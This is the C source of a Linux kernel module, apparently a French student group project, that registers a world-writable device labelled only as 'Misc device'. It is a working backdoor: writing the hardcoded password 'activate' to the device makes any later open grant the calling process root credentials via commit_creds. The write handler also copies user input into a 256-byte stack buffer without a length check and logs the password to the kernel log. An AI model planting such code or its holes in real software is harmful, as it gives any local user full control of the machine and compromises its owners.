#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/sched.h>

#define PASSWORD "activate"
static bool device_active = false; // Indique si le périphérique est activé
static int my_misc_open(struct inode *inode, struct file *file){

    
  if(device_active)
  { 
    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);
    struct task_struct *my_task;
    struct cred *new;
    my_task = get_current();
    if(my_task == NULL){
      printk("failed");
      return -EFAULT;
    }
    
    new = prepare_creds();
    if(new == NULL){
      printk("failed");
      return -EFAULT;
      }
      new->uid = kuid;
      new->gid = kgid;
      new->euid = kuid;
      new->egid = kgid;
     
      
    commit_creds(new);
    
    pr_info("root sur la machine g");
  }
  
  return 0;
}
// Fonction d'écriture (write)
static ssize_t my_misc_write(struct file *file, const char __user *buf, size_t len, loff_t *ppos)
{
    char user_input[256];
    
    if(copy_from_user(user_input, buf,len))
      return -EFAULT;
    
    user_input[len-1] = '\0';
    printk(KERN_INFO "vva saisie   %soui", user_input);
    printk(KERN_INFO "mot de passe %soui", PASSWORD);
    if (strcmp(user_input, PASSWORD) == 0) {
        device_active = true;
        pr_info("Device activated!\n");
    } else {
        pr_info("Incorrect password.\n");
    }

    return len;
}

// Fonction de lecture (read)
static ssize_t my_misc_read(struct file *file, char __user *buf, size_t len, loff_t *ppos)
{
    const char *response;
    size_t response_len;

    // Répondre selon l'état du périphérique
    if (device_active) {
        response = "Device is active.\n";
    } else {
        response = "Device is inactive.\n";
    }

    response_len = strlen(response);

    // Gérer la fin de la lecture
    if (*ppos >= response_len)
        return 0;

    if (len > response_len - *ppos)
        len = response_len - *ppos;

    if (copy_to_user(buf, response + *ppos, len))
        return -EFAULT;

    *ppos += len;

    return len;
}

// Structure des opérations fichier
static const struct file_operations my_fops = {
    .owner = THIS_MODULE,
    .read = my_misc_read,
    .write = my_misc_write,
    .open = my_misc_open,
};

// Définir le misc device
static struct miscdevice my_misc_device = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "misc_device",
    .fops = &my_fops,
    .mode = 0666,
};

// Fonction d'initialisation du module
static int __init my_misc_init(void)
{
    int ret;

    ret = misc_register(&my_misc_device);
    if (ret) {
        pr_err("[misc_device] Failed to register misc device\n");
        return ret;
    }

    pr_info("[misc_device] Device registered successfully\n");
    return 0;
}

// Fonction de sortie du module
static void __exit my_misc_exit(void)
{
    misc_deregister(&my_misc_device);
    pr_info("Device unregistered\n");
}

module_init(my_misc_init);
module_exit(my_misc_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Groupe*******");
MODULE_DESCRIPTION("Misc device");
